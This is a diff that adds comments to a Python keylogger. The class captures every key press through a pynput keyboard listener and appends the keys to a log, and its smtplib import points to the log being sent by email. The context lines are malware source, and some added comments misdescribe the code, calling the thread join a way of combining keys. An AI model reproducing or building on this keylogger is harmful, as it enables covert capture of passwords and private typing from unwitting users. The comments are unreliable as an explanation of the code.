@@ -1,6 +1,7 @@
 #!usr/bin/env python
 
 import pynput.keyboard
+#Class to monitor keyboard
 import threading
 import smtplib
 
@@ -17,6 +18,7 @@ class Keylogger:
         self.log += string
     
     def process_key_press (self, key):
+        #
         try:
             current_key = str(key.char)
             self.append_to_log(str(key.char))
@@ -43,9 +45,12 @@ class Keylogger:
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
+        #An instance of a Listener object to the pynput.keyboard to make a call back function everytime a key is press
         with keyboard_listener:
+            #start keyboard_listener
             self.report()
             keyboard_listener.join()
+            #.join is to add the current key being monitor with older key monitored
 
 
 
